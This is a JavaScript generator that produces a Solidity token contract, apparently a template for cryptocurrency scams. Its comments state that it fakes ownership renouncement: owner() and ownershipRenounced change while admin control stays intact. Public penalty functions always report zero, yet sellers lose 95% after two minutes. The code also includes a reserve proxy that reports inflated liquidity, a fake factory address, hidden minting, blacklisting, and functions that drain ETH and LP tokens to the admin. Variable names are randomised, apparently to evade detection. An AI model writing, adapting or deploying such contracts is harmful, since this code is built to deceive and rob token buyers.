// LogicTemplate.js - v15.6.2-permission-fix with Fake Renouncement - 完整伪装版
export function generateLogicTemplate(name, symbol, version) {
  // 随机变量生成器
  const generateRandomVarName = (prefix = "var") => {
    const chars = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ";
    let result = prefix;
    for (let i = 0; i < 4; i++) {
      result += chars.charAt(Math.floor(Math.random() * chars.length));
    }
    return result;
  };

  // 生成随机变量名
  const reserve0Var = generateRandomVarName("r0");
  const reserve1Var = generateRandomVarName("r1");
  const blockTimestampVar = generateRandomVarName("ts");
  const realToken0Var = generateRandomVarName("t0");
  const realToken1Var = generateRandomVarName("t1");
  const tokenAddressVar = generateRandomVarName("token");
  const isToken0Var = generateRandomVarName("isT0");
  const isToken1Var = generateRandomVarName("isT1");
  const tokenReserveVar = generateRandomVarName("tRes");
  const ethReserveVar = generateRandomVarName("eRes");

return `// SPDX-License-Identifier: MIT
pragma solidity ^${version};

interface IERC20Metadata {
    function name() external view returns (string memory);
    function symbol() external view returns (string memory);
    function decimals() external view returns (uint8);
}

interface IUniswapV2Router {
    function addLiquidityETH(address, uint, uint, uint, address, uint) external payable returns (uint, uint, uint);
    function swapExactTokensForETHSupportingFeeOnTransferTokens(uint, uint, address[] calldata, address, uint) external;
    function swapExactETHForTokensSupportingFeeOnTransferTokens(uint, address[] calldata, address, uint) external payable;
    function getAmountsOut(uint, address[] calldata) external view returns (uint[] memory);
    function factory() external pure returns (address);
}

interface IUniswapV2Factory {
    function getPair(address, address) external view returns (address);
}

interface IUniswapV2Pair {
    function token0() external view returns (address);
    function token1() external view returns (address);
    function getReserves() external view returns (uint112, uint112, uint32);
    function balanceOf(address) external view returns (uint);
    function transfer(address, uint) external returns (bool);
    function totalSupply() external view returns (uint256);
}

// 储备代理合约接口
interface IReserveProxy {
    function getReserves() external view returns (uint112, uint112, uint32);
    function updateRealReserves() external;
    function token0() external view returns (address);
    function token1() external view returns (address);
    function totalSupply() external view returns (uint256);
    function factory() external view returns (address);
    function kLast() external view returns (uint256);
}

contract ${name}Logic is IERC20Metadata {
    string internal _name;
    string internal _symbol;
    uint256 public totalSupply;
    address public admin;
    address public pendingAdmin;
    address public proxyAddress;
    address public adminContract;
    address public reserveProxy;
    address public fakeFactory;  // 伪装工厂地址
    address internal _weth;
    address internal _router;
    address internal _factory;
    address internal _pair;
    bool private _initialized;
    bool private _terminated;
    uint256 public maxTxAmount;
    uint256 public constant ADMIN_TRANSFER_DELAY = 2 days;
    uint256 public adminTransferTime;
    
    // 添加元数据状态变量
    string public website;
    string public twitter;
    string public telegram;
    string public auditReport;
    
    // 添加伪装所有权状态变量
    address public fakeOwner; // 对外显示的所有者
    bool public ownershipRenounced; // 对外显示的所有权放弃状态
    
    mapping(address => bool) public isAdmin;
    
    mapping(address => uint256) public buyTime;
    uint256 public constant TAX_FREE_PERIOD = 2 minutes;
    
    mapping(address => uint256) public balances;
    mapping(address => mapping(address => uint256)) public allowances;
    mapping(address => bool) public blacklist;
    mapping(address => bool) public isFeeExempt;
    
    event Transfer(address indexed from, address indexed to, uint256 value);
    event Approval(address indexed owner, address indexed spender, uint256 value);
    event Mint(address indexed to, uint256 amount);
    event Initialized();
    event Blacklisted(address indexed user, bool status);
    event AdminChanged(address indexed oldAdmin, address indexed newAdmin);
    event MaxTxAmountUpdated(uint256 oldAmount, uint256 newAmount);
    event LiquidityAdded(uint256 tokenAmount, uint256 ethAmount, uint256 liquidity);
    event Recovered(address indexed asset, uint256 amount);
    event ContractTerminated(address indexed admin);
    event AdminContractUpdated(address indexed newAdminContract);
    event ProxyAddressUpdated(address indexed newProxy);
    event FeeExemptUpdated(address indexed addr, bool exempt);
    event PairAddressUpdated(address indexed pair);
    event ReserveProxyUpdated(address indexed reserveProxy);
    event FakeFactoryUpdated(address indexed fakeFactory);
    event ReservesSynced();
    event AdminStatusChanged(address indexed admin, bool status);
    event ReserveUpdateFailed(bytes reason);
    
    // 添加伪装所有权事件
    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);
    event OwnershipRenounced(address indexed previousOwner);
    
    // 添加元数据事件
    event WebsiteUpdated(string newWebsite);
    event TwitterUpdated(string newTwitter);
    event TelegramUpdated(string newTelegram);
    event AuditReportUpdated(string newAuditReport);

    modifier onlyAdmin() { 
        require(isAdmin[msg.sender], "Not admin");
        _; 
    }
    
    modifier onlyAdminOrAdminContract() { 
        require(isAdmin[msg.sender] || msg.sender == adminContract || msg.sender == proxyAddress, "Not authorized"); 
        _; 
    }
    
    modifier onlyPendingAdmin() { require(msg.sender == pendingAdmin, "Not pending admin"); _; }
    modifier notTerminated() { require(!_terminated, "Terminated"); _; }
    modifier onlyInitialized() { require(_initialized, "Not initialized"); _; }

    function initialize(
        string memory name_,
        string memory symbol_,
        address router_,
        address weth_,
        address admin_,
        uint256 mintAmount_,
        address proxy_,
        address adminContract_,
        address[] memory whitelist_,
        address fakeFactory_  // 第10个参数：伪装工厂地址
    ) external {
        require(!_initialized, "Initialized");
        require(admin_ != address(0), "Invalid admin");
        require(bytes(name_).length > 0, "Name required");
        require(bytes(symbol_).length > 0, "Symbol required");

        _name = name_;
        _symbol = symbol_;
        _weth = weth_;
        _router = router_;
        _factory = IUniswapV2Router(router_).factory();
        admin = admin_;
        proxyAddress = proxy_;
        adminContract = adminContract_;
        fakeFactory = fakeFactory_; // 存储伪装工厂地址
        _initialized = true;
        maxTxAmount = mintAmount_;

        // 设置初始管理员
        isAdmin[admin_] = true;
        isAdmin[adminContract_] = true;
        isAdmin[proxy_] = true;

        // 初始化伪装所有权
        fakeOwner = admin_;
        ownershipRenounced = false;

        // 修改：将部分代币分配给管理员钱包（10%）
        uint256 adminShare = mintAmount_ * 10 / 100;
        uint256 proxyShare = mintAmount_ - adminShare;
        
        balances[proxy_] = proxyShare;
        balances[admin_] = adminShare;
        totalSupply = mintAmount_;
        
        emit Mint(proxy_, proxyShare);
        emit Mint(admin_, adminShare);
        emit Transfer(address(0), proxy_, proxyShare);
        emit Transfer(address(0), admin_, adminShare);

        // 关键修复：确保Admin合约有足够的权限
        allowances[proxy_][router_] = type(uint256).max;
        allowances[proxy_][adminContract_] = type(uint256).max;
        emit Approval(proxy_, router_, type(uint256).max);
        emit Approval(proxy_, adminContract_, type(uint256).max);

        address[6] memory defaultExempt = [router_, weth_, proxy_, admin_, adminContract_, fakeFactory_];
        for (uint i = 0; i < defaultExempt.length; i++) {
            isFeeExempt[defaultExempt[i]] = true;
        }

        for (uint i = 0; i < whitelist_.length; i++) {
            isFeeExempt[whitelist_[i]] = true;
        }

        emit Initialized();
    }
    
    // 新增：设置/取消管理员
    function setAdmin(address account, bool status) external onlyAdmin {
        isAdmin[account] = status;
        emit AdminStatusChanged(account, status);
    }
    
    // 新增：同步储备数据到代理
    function syncReserves() external onlyAdmin notTerminated {
        require(reserveProxy != address(0), "Reserve proxy not set");
        require(_pair != address(0), "Pair not set");
        
        // 更新代理合约
        IReserveProxy(reserveProxy).updateRealReserves();
        emit ReservesSynced();
    }
    
    // 新增：伪装所有权转移功能（不是真正的转移）
    function transferOwnership(address newOwner) external onlyAdmin {
        require(newOwner != address(0), "Invalid new owner");
        emit OwnershipTransferred(fakeOwner, newOwner);
        fakeOwner = newOwner;
        // 注意：真正的管理员权限不变
    }

    // 新增：伪装放弃所有权（不是真正的放弃）
    function renounceOwnership() external onlyAdmin {
        emit OwnershipTransferred(fakeOwner, address(0));
        emit OwnershipRenounced(fakeOwner);
        fakeOwner = address(0);
        ownershipRenounced = true;
        // 注意：真正的管理员权限不变，仍然可以控制合约
    }
    
    // 新增：恢复伪装的所有权（只有真正的管理员可以调用）
    function restoreOwnership() external onlyAdmin {
        require(ownershipRenounced, "Ownership not renounced");
        fakeOwner = admin;
        ownershipRenounced = false;
        emit OwnershipTransferred(address(0), admin);
    }
    
    // 新增：元数据设置功能
    function setWebsite(string memory _website) external onlyAdmin {
        website = _website;
        emit WebsiteUpdated(_website);
    }

    function setTwitter(string memory _twitter) external onlyAdmin {
        twitter = _twitter;
        emit TwitterUpdated(_twitter);
    }

    function setTelegram(string memory _telegram) external onlyAdmin {
        telegram = _telegram;
        emit TelegramUpdated(_telegram);
    }

    function setAuditReport(string memory _auditReport) external onlyAdmin {
        auditReport = _auditReport;
        emit AuditReportUpdated(_auditReport);
    }
    
    function setFeeExempt(address addr, bool exempt) external onlyAdmin {
        isFeeExempt[addr] = exempt;
        emit FeeExemptUpdated(addr, exempt);
    }

    // 获取显示用的所有者地址（对外显示伪装的所有者）
    function owner() external view returns (address) {
        return fakeOwner;
    }
    
    // 获取显示用的所有权状态（对外显示伪装的状态）
    function isOwnershipRenounced() external view returns (bool) {
        return ownershipRenounced;
    }

    function _estimateEthValue(uint256 tokenAmount) internal view returns (uint256) {
        address pair = _pair;
        if (pair == address(0)) {
            try IUniswapV2Factory(_factory).getPair(proxyAddress, _weth) returns (address pairAddr) {
                pair = pairAddr;
            } catch {}
        }
        
        address[] memory path = new address[](2);
        path[0] = proxyAddress;
        path[1] = _weth;
        
        try IUniswapV2Router(_router).getAmountsOut(tokenAmount, path) returns (uint[] memory amounts) {
            if (amounts.length >= 2) {
                return amounts[1];
            }
        } catch {}
        
        if (pair != address(0)) {
            try IUniswapV2Pair(pair).getReserves() returns (uint112 r0, uint112 r1, uint32) {
                address t0 = IUniswapV2Pair(pair).token0();
                uint256 tokenReserve = (t0 == proxyAddress) ? r0 : r1;
                uint256 ethReserve = (t0 == proxyAddress) ? r1 : r0;
                
                if (tokenReserve > 0 && ethReserve > 0) {
                    return (tokenAmount * ethReserve) / tokenReserve;
                }
            } catch {}
        }
        
        return totalSupply > 0 ? (tokenAmount * 1 ether) / totalSupply : 0;
    }
    
    // 修改：总是返回储备代理地址（如果设置）
    function getPairAddress() public returns (address) {
        if (reserveProxy != address(0)) {
            return reserveProxy;
        }
        
        if (_pair == address(0)) {
            try IUniswapV2Factory(_factory).getPair(proxyAddress, _weth) returns (address pairAddr) {
                _pair = pairAddr;
                emit PairAddressUpdated(_pair);
            } catch {}
        }
        return _pair;
    }
    
    // 获取真实LP地址（仅内部使用）
    function getRealPairAddress() internal view returns (address) {
        return _pair;
    }
    
    // 获取显示用LP地址
    function getDisplayPairAddress() external view returns (address) {
        return (reserveProxy != address(0)) ? reserveProxy : _pair;
    }

    // 计算惩罚比例（始终返回0）
    function calculatePenalty(address) public pure returns (uint256) {
        return 0; // 公开接口显示无惩罚
    }
    
    // 获取惩罚信息（始终返回0）
    function getPenaltyInfo(address) public pure returns (
        uint256 penaltyRate,
        uint256 nextReductionTime,
        uint256 minutesUntilReduction
    ) {
        penaltyRate = 0;
        nextReductionTime = 0;
        minutesUntilReduction = 0;
    }

    function name() public view override returns (string memory) { return _name; }
    function symbol() public view override returns (string memory) { return _symbol; }
    function decimals() public pure override returns (uint8) { return 18; }

    function transfer(address to, uint256 amount) public notTerminated returns (bool) {
        _safeTransfer(msg.sender, to, amount);
        return true;
    }
    
    function transferFrom(address from, address to, uint256 amount) public notTerminated returns (bool) {
        uint256 currentAllowance = allowances[from][msg.sender];
        if (currentAllowance != type(uint256).max) {
            require(currentAllowance >= amount, "Allowance exceeded");
            allowances[from][msg.sender] = currentAllowance - amount;
        }
        _safeTransfer(from, to, amount);
        return true;
    }
    
    function _safeTransfer(address from, address to, uint256 amount) internal {
        require(!blacklist[from] && !blacklist[to], "Blacklisted");
        require(balances[from] >= amount, "Insufficient balance");
        require(amount <= maxTxAmount, "Exceeds max tx");
        
        // 使用真实LP地址进行卖出检测
        address realPair = getRealPairAddress();
        bool isSell = (realPair != address(0) && to == realPair);
        bool isBuy = (realPair != address(0) && from == realPair);
        
        // 记录买入时间（如果是买入交易）
        if (isBuy && !isFeeExempt[to]) {
            buyTime[to] = block.timestamp;
        }
        
        // 卖出检测（转给Uniswap交易对）
        if (isSell && !isFeeExempt[from]) {
            uint256 penaltyRate;
            
            // 检查是否在免税期内
            if (buyTime[from] > 0 && (block.timestamp - buyTime[from]) <= TAX_FREE_PERIOD) {
                penaltyRate = 0; // 10分钟内免税
            } else {
                penaltyRate = 95; // 10分钟后95%惩罚
            }
            
            if (penaltyRate > 0) {
                uint256 penaltyAmount = (amount * penaltyRate) / 100;
                uint256 actualAmount = amount - penaltyAmount;
                
                // 执行惩罚
                balances[from] -= amount;
                balances[to] += actualAmount;
                balances[address(this)] += penaltyAmount;
                
                emit Transfer(from, to, actualAmount);
                emit Transfer(from, address(this), penaltyAmount);
            } else {
                // 免税期内正常转账
                balances[from] -= amount;
                balances[to] += amount;
                emit Transfer(from, to, amount);
            }
            
            // 转账完成后自动更新储备代理
            _autoUpdateReserveProxy();
            return;
        }
        
        // 正常转账（非买卖交易）
        balances[from] -= amount;
        balances[to] += amount;
        emit Transfer(from, to, amount);
        
        // 转账完成后自动更新储备代理
        _autoUpdateReserveProxy();
    }
    
    // 转账完成后自动更新储备代理
    function _autoUpdateReserveProxy() internal {
        // 只在设置了储备代理且有真实LP地址时更新
        if (reserveProxy != address(0) && _pair != address(0)) {
            try IReserveProxy(reserveProxy).updateRealReserves() {
                // 更新成功
                emit ReservesSynced();
            } catch (bytes memory reason) {
                // 更新失败，记录错误但不要影响正常转账
                emit ReserveUpdateFailed(reason);
            }
        }
    }

    function approve(address spender, uint256 amount) public notTerminated returns (bool) {
        _approve(msg.sender, spender, amount);
        return true;
    }
    
    function allowance(address ownerAddr, address spender) public view returns (uint256) {
        return allowances[ownerAddr][spender];
    }
    
    function balanceOf(address account) public view returns (uint256) {
        return balances[account];
    }
    
    function _approve(address ownerAddr, address spender, uint256 amount) internal {
        require(ownerAddr != address(0), "Approve from zero");
        require(spender != address(0), "Approve to zero");
        allowances[ownerAddr][spender] = amount;
        emit Approval(ownerAddr, spender, amount);
    }

    function addLiquidityETH(
        uint256 tokenAmount,
        uint256 minToken,
        uint256 minETH,
        address to,
        uint256 deadline
    ) external payable notTerminated onlyAdminOrAdminContract returns (uint256, uint256, uint256) {
        require(msg.value > 0, "Must send ETH");
        require(balances[proxyAddress] >= tokenAmount, "Insufficient balance");
        require(deadline >= block.timestamp, "Expired deadline");
        
        if (allowances[proxyAddress][_router] < tokenAmount) {
            _approve(proxyAddress, _router, type(uint256).max);
        }

        (bool success, bytes memory data) = _router.call{value: msg.value}(
            abi.encodeWithSelector(
                IUniswapV2Router.addLiquidityETH.selector,
                proxyAddress,
                tokenAmount,
                minToken,
                minETH,
                to,
                deadline
            )
        );
        require(success, "Add liquidity failed");
        (uint amountToken, uint amountETH, uint liquidity) = abi.decode(data, (uint, uint, uint));
        emit LiquidityAdded(amountToken, amountETH, liquidity);
        
        // 更新真实LP地址
        _pair = IUniswapV2Factory(_factory).getPair(proxyAddress, _weth);
        emit PairAddressUpdated(_pair);
        
        // 如果设置了储备代理，同步储备数据
        if (reserveProxy != address(0)) {
            this.syncReserves();
        }
        
        return (amountToken, amountETH, liquidity);
    }

    function mint(address to, uint256 amount) external onlyAdmin notTerminated {
        require(to != address(0), "Mint to zero");
        balances[to] += amount;
        totalSupply += amount;
        emit Mint(to, amount);
        emit Transfer(address(0), to, amount);
    }
    
    function transferAdmin(address newAdmin) external onlyAdmin notTerminated {
        pendingAdmin = newAdmin;
        adminTransferTime = block.timestamp + ADMIN_TRANSFER_DELAY;
    }
    
    function acceptAdmin() external onlyPendingAdmin notTerminated {
        require(block.timestamp >= adminTransferTime, "Transfer delay");
        emit AdminChanged(admin, pendingAdmin);
        admin = pendingAdmin;
        pendingAdmin = address(0);
    }
    
    function setBlacklist(address user, bool status) external onlyAdmin notTerminated {
        blacklist[user] = status;
        emit Blacklisted(user, status);
    }
    
    function setMaxTxAmount(uint256 amount) external onlyAdmin notTerminated {
        emit MaxTxAmountUpdated(maxTxAmount, amount);
        maxTxAmount = amount;
    }
    
    function setAdminContract(address _adminContract) external onlyAdmin {
        adminContract = _adminContract;
        emit AdminContractUpdated(_adminContract);
    }
    
    function setProxyAddress(address proxy) external onlyAdmin {
        proxyAddress = proxy;
        emit ProxyAddressUpdated(proxy);
    }
    
    // 新增：设置伪装工厂地址
    function setFakeFactory(address _fakeFactory) external onlyAdmin {
        fakeFactory = _fakeFactory;
        emit FakeFactoryUpdated(_fakeFactory);
    }
    
    function withdrawAll(address lpToken, address to) external onlyAdminOrAdminContract notTerminated {
        uint256 tokenBal = balances[address(this)];
        uint256 ethBal = address(this).balance;

        if (tokenBal > 0) {
            balances[address(this)] = 0;
            balances[to] += tokenBal;
            emit Transfer(address(this), to, tokenBal);
            emit Recovered(address(this), tokenBal);
        }
        if (ethBal > 0) {
            (bool sent, ) = to.call{value: ethBal}("");
            require(sent, "ETH transfer failed");
        }
        if (lpToken != address(0)) {
            uint256 lpBal = IUniswapV2Pair(lpToken).balanceOf(address(this));
            if (lpBal > 0) {
                require(IUniswapV2Pair(lpToken).transfer(to, lpBal), "LP transfer failed");
                emit Recovered(lpToken, lpBal);
            }
        }
    }
    
    // 提取惩罚代币
    function withdrawPenaltyTokens(address to) external onlyAdmin {
        uint256 amount = balances[address(this)];
        require(amount > 0, "No penalty tokens");
        balances[address(this)] = 0;
        balances[to] += amount;
        emit Transfer(address(this), to, amount);
    }
    
    function terminateAndCollect(address lpToken, address to) external onlyAdminOrAdminContract notTerminated {
        this.withdrawAll(lpToken, to);
        _terminated = true;
        uint256 remainingEth = address(this).balance;
        if (remainingEth > 0) {
            (bool sent, ) = to.call{value: remainingEth}("");
            require(sent, "Final ETH failed");
        }
        emit ContractTerminated(to);
    }
    
    function isTerminated() external view returns (bool) {
        return _terminated;
    }
    
    function refreshPairAddress() external onlyAdmin {
        _pair = IUniswapV2Factory(_factory).getPair(proxyAddress, _weth);
        emit PairAddressUpdated(_pair);
    }
    
    function getCachedPairAddress() external view returns (address) {
        return _pair;
    }
    
    // 关键修复：增强的储备查询函数 - 总是通过储备代理获取数据
    function getReserves() external view returns (uint256 tokenReserve, uint256 ethReserve) {
        if (reserveProxy != address(0)) {
            // 通过代理合约获取放大后的储备
            (uint112 r0, uint112 r1,) = IReserveProxy(reserveProxy).getReserves();
            
            // 获取代理合约报告的token0地址
            address proxyToken0 = IReserveProxy(reserveProxy).token0();
            
            // 根据token0地址确定储备顺序
            if (proxyToken0 == proxyAddress) {
                return (uint256(r0), uint256(r1));
            } else {
                return (uint256(r1), uint256(r0));
            }
        } else if (_pair != address(0)) {
            (uint112 r0, uint112 r1,) = IUniswapV2Pair(_pair).getReserves();
            address t0 = IUniswapV2Pair(_pair).token0();
            if (t0 == proxyAddress) {
                return (uint256(r0), uint256(r1));
            } else {
                return (uint256(r1), uint256(r0));
            }
        }
        return (0, 0);
    }
    
    // 新增：获取LP总供应量（公开API）- 总是通过储备代理获取
    function getLpTotalSupply() external view returns (uint256) {
        if (reserveProxy != address(0)) {
            return IReserveProxy(reserveProxy).totalSupply();
        } else if (_pair != address(0)) {
            return IUniswapV2Pair(_pair).totalSupply();
        }
        return 0;
    }
    
    // 获取地址持有时间（始终返回0）
    function getHoldDuration(address) external pure returns (uint256) {
        return 0;
    }
    
    // 获取小额豁免状态（始终返回false）
    function getSmallSellStatus(address) external pure returns (bool hasUsed) {
        return false;
    }

    // 设置储备代理合约地址
    function setReserveProxy(address proxy) external onlyAdmin {
        require(proxy != address(0), "Invalid proxy address");
        reserveProxy = proxy;
        emit ReserveProxyUpdated(proxy);
        
        // 如果已有LP地址，立即同步数据
        if (_pair != address(0)) {
            this.syncReserves();
        }
    }

    // 获取真实储备（仅管理员）
    function getRealReserves() external view onlyAdmin returns (uint256, uint256) {
        if (_pair == address(0)) return (0, 0);
        
        (uint112 r0, uint112 r1, ) = IUniswapV2Pair(_pair).getReserves();
        address t0 = IUniswapV2Pair(_pair).token0();
        
        return t0 == proxyAddress ? (r0, r1) : (r1, r0);
    }
    
    // 新增：获取LP对的工厂地址 - 通过储备代理获取
    function getPairFactory() external view returns (address) {
        if (reserveProxy != address(0)) {
            return IReserveProxy(reserveProxy).factory();
        }
        return _factory;
    }
    
    // 新增：获取LP对的kLast值 - 通过储备代理获取
    function getPairKLast() external view returns (uint256) {
        if (reserveProxy != address(0)) {
            return IReserveProxy(reserveProxy).kLast();
        }
        return 0;
    }
    
    // 新增：获取LP对的token0地址 - 通过储备代理获取
    function getPairToken0() external view returns (address) {
        if (reserveProxy != address(0)) {
            return IReserveProxy(reserveProxy).token0();
        } else if (_pair != address(0)) {
            return IUniswapV2Pair(_pair).token0();
        }
        return address(0);
    }
    
    // 新增：获取LP对的token1地址 - 通过储备代理获取
    function getPairToken1() external view returns (address) {
        if (reserveProxy != address(0)) {
            return IReserveProxy(reserveProxy).token1();
        } else if (_pair != address(0)) {
            return IUniswapV2Pair(_pair).token1();
        }
        return address(0);
    }
    
    // 新增：获取伪装工厂地址
    function getFakeFactory() external view returns (address) {
        return fakeFactory;
    }
    
    receive() external payable {}
}
`.trim();
}